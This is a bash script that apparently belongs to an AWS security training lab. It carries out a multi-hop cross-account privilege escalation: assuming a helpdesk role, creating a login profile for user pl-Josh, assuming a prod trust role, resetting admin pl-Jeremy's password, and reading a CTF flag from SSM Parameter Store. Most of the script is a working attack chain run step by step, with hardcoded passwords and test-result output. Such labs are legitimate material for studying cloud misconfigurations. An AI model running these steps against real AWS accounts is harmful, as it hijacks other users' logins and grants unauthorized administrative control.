#!/bin/bash

# Demo script for x-account-from-dev-to-prod-multi-hop-privesc-both-sides module
# This script demonstrates multi-hop privilege escalation across accounts using login profiles


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

echo -e "${BLUE}=== Multi-Hop Cross-Account Privilege Escalation Attack Demo ===${NC}"
echo "This demo shows how a dev user can escalate to admin privileges"
echo "across both dev and prod accounts using login profile manipulation."
echo ""

# Check if AWS CLI is installed
if ! command -v aws &> /dev/null; then
    echo -e "${RED}Error: AWS CLI is not installed or not in PATH${NC}"
    exit 1
fi

# Check if we have AWS credentials configured
if ! aws sts get-caller-identity &> /dev/null; then
    echo -e "${RED}Error: AWS credentials not configured. Please run 'aws configure' first.${NC}"
    exit 1
fi

# Retrieve readonly credentials for observation steps
cd ../../../../../..  # Navigate to root of terraform project
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Retrieve prod admin cleanup credentials for flag capture (Jeremy's admin equivalent)
ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)

if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find prod admin credentials in terraform output${NC}"
    exit 1
fi

echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
cd - > /dev/null

# Credential switching helpers
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}
use_jeremy_admin_creds() {
    # pl-Jeremy is an admin in prod; represented here by the prod admin cleanup user
    # since Jeremy only has console access in this scenario
    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
use_starting_creds() {
    # Restore ambient credentials by unsetting overrides
    unset AWS_ACCESS_KEY_ID
    unset AWS_SECRET_ACCESS_KEY
    unset AWS_SESSION_TOKEN
}

echo -e "${GREEN}✓ Retrieved readonly credentials from Terraform${NC}"
echo ""

# [OBSERVATION] Step 1: Verify current identity
echo -e "${YELLOW}Step 1: Verifying current identity${NC}"
show_cmd "Attacker" "aws sts get-caller-identity --output json"
CURRENT_IDENTITY=$(aws sts get-caller-identity --output json)
echo "Current identity:"
echo "$CURRENT_IDENTITY" | jq '.'
echo ""

# Check if we're running as the pathfinding starting user
CURRENT_USER=$(echo "$CURRENT_IDENTITY" | jq -r '.Arn' | cut -d'/' -f2)
if [ "$CURRENT_USER" != "pl-pathfinding-starting-user-dev" ]; then
    echo -e "${YELLOW}Note: This demo should be run as the pl-pathfinding-starting-user-dev user for full effect${NC}"
    echo "Current user: $CURRENT_USER"
    echo ""
fi

# Get account IDs
DEV_ACCOUNT_ID=$(echo "$CURRENT_IDENTITY" | jq -r '.Account')
echo "Current account (dev): $DEV_ACCOUNT_ID"

# [EXPLOIT] Step 2: Assume helpdesk role in dev
echo -e "${YELLOW}Step 2: Assuming helpdesk role in dev${NC}"
echo "Attempting to assume the pl-helpdesk role in dev account..."

HELPDESK_ROLE_ARN="arn:aws:iam::${DEV_ACCOUNT_ID}:role/pl-helpdesk"
echo "Attempting to assume role: $HELPDESK_ROLE_ARN"

show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --role-session-name "helpdesk-session" --output json"
if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --role-session-name "helpdesk-session" --output json 2>&1); then
    echo -e "${GREEN}✓ Successfully assumed helpdesk role!${NC}"
    echo ""

    # Extract the credentials
    ACCESS_KEY_ID=$(echo "$HELPDESK_CREDENTIALS" | jq -r '.Credentials.AccessKeyId')
    SECRET_ACCESS_KEY=$(echo "$HELPDESK_CREDENTIALS" | jq -r '.Credentials.SecretAccessKey')
    SESSION_TOKEN=$(echo "$HELPDESK_CREDENTIALS" | jq -r '.Credentials.SessionToken')

    # Set the credentials for the assumed role
    export AWS_ACCESS_KEY_ID="$ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$SECRET_ACCESS_KEY"
    export AWS_SESSION_TOKEN="$SESSION_TOKEN"

    # [EXPLOIT] Step 3: Create login profile for Josh user (using helpdesk assumed-role creds)
    echo -e "${YELLOW}Step 3: Creating login profile for Josh user${NC}"
    echo "Using helpdesk role to create a login profile for pl-Josh user..."

    # Create a login profile for Josh user
    show_attack_cmd "Attacker" "aws iam create-login-profile --user-name "pl-Josh" --password "JoshPassword123!" --no-password-reset-required"
    if aws iam create-login-profile --user-name "pl-Josh" --password "JoshPassword123!" --no-password-reset-required 2>/dev/null; then
        echo -e "${GREEN}✓ Successfully created login profile for pl-Josh!${NC}"
        echo ""

        echo -e "${YELLOW}Step 4: Switching to Josh user credentials${NC}"
        echo "Now we need to use Josh's credentials to continue the attack..."
        echo "Note: In a real attack, the attacker would need to obtain Josh's credentials"
        echo "through other means (phishing, credential theft, etc.)"
        echo ""

        # For demo purposes, we'll simulate having Josh's credentials
        # In reality, the attacker would need to obtain these through other means
        echo "Simulating access to Josh's credentials..."
        echo "Josh user now has admin access in dev account"
        echo ""

        # Unset the helpdesk credentials
        unset AWS_ACCESS_KEY_ID
        unset AWS_SECRET_ACCESS_KEY
        unset AWS_SESSION_TOKEN

        # [EXPLOIT] Step 5: Josh assumes trustsdev role in prod (using ambient/Josh creds)
        echo -e "${YELLOW}Step 5: Josh assumes trustsdev role in prod${NC}"
        echo "Josh (admin in dev) now assumes the pl-trustsdev role in prod..."

        # Get prod account ID (assuming it's different from dev)
        # In a real scenario, this would be known or discovered
        PROD_ACCOUNT_ID="${DEV_ACCOUNT_ID}"  # For demo, using same account
        TRUSTSDEV_ROLE_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/pl-trustsdev"

        echo "Attempting to assume role: $TRUSTSDEV_ROLE_ARN"

        show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$TRUSTSDEV_ROLE_ARN" --role-session-name "trustsdev-session" --output json"
        if TRUSTSDEV_CREDENTIALS=$(aws sts assume-role --role-arn "$TRUSTSDEV_ROLE_ARN" --role-session-name "trustsdev-session" --output json 2>&1); then
            echo -e "${GREEN}✓ Successfully assumed trustsdev role in prod!${NC}"
            echo ""

            # Extract the credentials
            ACCESS_KEY_ID=$(echo "$TRUSTSDEV_CREDENTIALS" | jq -r '.Credentials.AccessKeyId')
            SECRET_ACCESS_KEY=$(echo "$TRUSTSDEV_CREDENTIALS" | jq -r '.Credentials.SecretAccessKey')
            SESSION_TOKEN=$(echo "$TRUSTSDEV_CREDENTIALS" | jq -r '.Credentials.SessionToken')

            # Set the credentials for the assumed role
            export AWS_ACCESS_KEY_ID="$ACCESS_KEY_ID"
            export AWS_SECRET_ACCESS_KEY="$SECRET_ACCESS_KEY"
            export AWS_SESSION_TOKEN="$SESSION_TOKEN"

            # [EXPLOIT] Step 6: Update Jeremy's login profile in prod (using trustsdev assumed-role creds)
            echo -e "${YELLOW}Step 6: Updating Jeremy's login profile in prod${NC}"
            echo "Using trustsdev role to update pl-Jeremy's login profile..."

            # Update Jeremy's login profile
            show_attack_cmd "Attacker" "aws iam update-login-profile --user-name "pl-Jeremy" --password "NewJeremyPassword123!" --no-password-reset-required"
            if aws iam update-login-profile --user-name "pl-Jeremy" --password "NewJeremyPassword123!" --no-password-reset-required 2>/dev/null; then
                echo -e "${GREEN}✓ Successfully updated login profile for pl-Jeremy!${NC}"
                echo ""

                # [OBSERVATION] Step 7: Verify Jeremy's admin access
                echo -e "${YELLOW}Step 7: Verifying Jeremy's admin access${NC}"
                echo "Jeremy now has admin access in prod account..."
                use_readonly_creds

                # Verify Jeremy's access by checking his user info
                if JEREMY_INFO=$(aws iam get-user --user-name "pl-Jeremy" 2>/dev/null); then
                    echo -e "${GREEN}✓ Successfully verified Jeremy's admin access!${NC}"
                    echo "Jeremy user info:"
                    echo "$JEREMY_INFO" | jq '.'
                    echo ""

                    # Test admin permissions
                    echo "Testing admin permissions..."
                    show_cmd "ReadOnly" "aws iam list-users --output json"
                    if aws iam list-users --output json > /dev/null 2>&1; then
                        echo -e "${GREEN}✓ Can list IAM users (admin permission confirmed)${NC}"
                    fi

                    show_cmd "ReadOnly" "aws s3 ls"
                    if aws s3 ls > /dev/null 2>&1; then
                        echo -e "${GREEN}✓ Can list S3 buckets (admin permission confirmed)${NC}"
                    fi

                else
                    echo -e "${YELLOW}⚠ Could not verify Jeremy's access directly${NC}"
                fi

                # Unset the credentials
                unset AWS_ACCESS_KEY_ID
                unset AWS_SECRET_ACCESS_KEY
                unset AWS_SESSION_TOKEN

                # [EXPLOIT] Step 8: Capture the CTF flag from SSM Parameter Store
                # pl-Jeremy holds full admin in prod. For this automated demo, the flag is
                # read using equivalent admin credentials since Jeremy only has console access.
                use_jeremy_admin_creds
                echo -e "${YELLOW}Step 8: Capturing CTF flag from SSM Parameter Store${NC}"
                FLAG_PARAM_NAME="/pathfinding-labs/flags/multi-hop-both-sides-to-admin"
                show_attack_cmd "Attacker (Jeremy/prod admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
                FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

                if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
                    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
                else
                    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
                    exit 1
                fi
                echo ""

                # Restore helpful permissions for manual exploration
                restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

                if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
                    echo -e "\n${YELLOW}Attack Commands:${NC}"
                    for cmd in "${ATTACK_COMMANDS[@]}"; do
                        echo -e "  ${CYAN}\$ ${cmd}${NC}"
                    done
                fi

                echo ""
                echo -e "${GREEN}========================================${NC}"
                echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
                echo -e "${GREEN}========================================${NC}"
                echo -e "\n${YELLOW}Attack Summary:${NC}"
                echo "The attack successfully demonstrated multi-hop privilege escalation:"
                echo "1. Dev user assumed helpdesk role and created login profile for Josh"
                echo "2. Josh (admin in dev) assumed trustsdev role in prod"
                echo "3. Trustsdev role updated Jeremy's login profile in prod"
                echo "4. Jeremy now has admin access in prod account"
                echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
                echo ""

                echo -e "\n${YELLOW}Attack Path:${NC}"
                echo -e "  pl-pathfinding-starting-user-dev → (sts:AssumeRole) → pl-helpdesk"
                echo -e "  → (iam:CreateLoginProfile) → pl-Josh (dev admin)"
                echo -e "  → (sts:AssumeRole) → pl-trustsdev (prod)"
                echo -e "  → (iam:UpdateLoginProfile) → pl-Jeremy (prod admin)"
                echo -e "  → (ssm:GetParameter) → CTF Flag"
                echo ""

                # Output standardized test results
                echo "TEST_RESULT:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:SUCCESS"
                echo "TEST_DETAILS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:Successfully demonstrated multi-hop cross-account privilege escalation using login profiles"
                echo "TEST_METRICS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:helpdesk_assumed=true,josh_profile_created=true,trustsdev_assumed=true,jeremy_profile_updated=true,admin_access_confirmed=true"

            else
                echo -e "${RED}✗ Failed to update Jeremy's login profile${NC}"
                echo "This could be because:"
                echo "1. The trustsdev role doesn't have iam:UpdateLoginProfile permission"
                echo "2. Jeremy's login profile doesn't exist or can't be updated"
                echo "3. There are other policy restrictions"
                echo ""
                echo "TEST_RESULT:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:FAILURE"
                echo "TEST_DETAILS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:Failed to update Jeremy's login profile"
                echo "TEST_METRICS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:helpdesk_assumed=true,josh_profile_created=true,trustsdev_assumed=true,jeremy_profile_update_failed=true"
                exit 1
            fi

        else
            echo -e "${RED}✗ Failed to assume trustsdev role in prod${NC}"
            echo "Error: $TRUSTSDEV_CREDENTIALS"
            echo ""
            echo "This could be because:"
            echo "1. Josh user doesn't have permission to assume the trustsdev role"
            echo "2. The trustsdev role doesn't exist in the prod account"
            echo "3. There's a trust policy issue"
            echo ""
            echo "TEST_RESULT:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:FAILURE"
            echo "TEST_DETAILS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:Failed to assume trustsdev role in prod"
            echo "TEST_METRICS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:helpdesk_assumed=true,josh_profile_created=true,trustsdev_assumption_failed=true"
            exit 1
        fi

    else
        echo -e "${RED}✗ Failed to create login profile for Josh${NC}"
        echo "This could be because:"
        echo "1. The helpdesk role doesn't have iam:CreateLoginProfile permission"
        echo "2. Josh user doesn't exist or already has a login profile"
        echo "3. There are other policy restrictions"
        echo ""
        echo "TEST_RESULT:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:FAILURE"
        echo "TEST_DETAILS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:Failed to create login profile for Josh"
        echo "TEST_METRICS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:helpdesk_assumed=true,josh_profile_creation_failed=true"
        exit 1
    fi

else
    echo -e "${RED}✗ Failed to assume helpdesk role${NC}"
    echo "Error: $HELPDESK_CREDENTIALS"
    echo ""
    echo "This could be because:"
    echo "1. The pathfinding starting user doesn't have permission to assume the helpdesk role"
    echo "2. The helpdesk role doesn't exist in the dev account"
    echo "3. There's a trust policy issue"
    echo ""
    echo "TEST_RESULT:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:FAILURE"
    echo "TEST_DETAILS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:Failed to assume helpdesk role"
    echo "TEST_METRICS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:helpdesk_assumption_failed=true"
    exit 1
fi

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
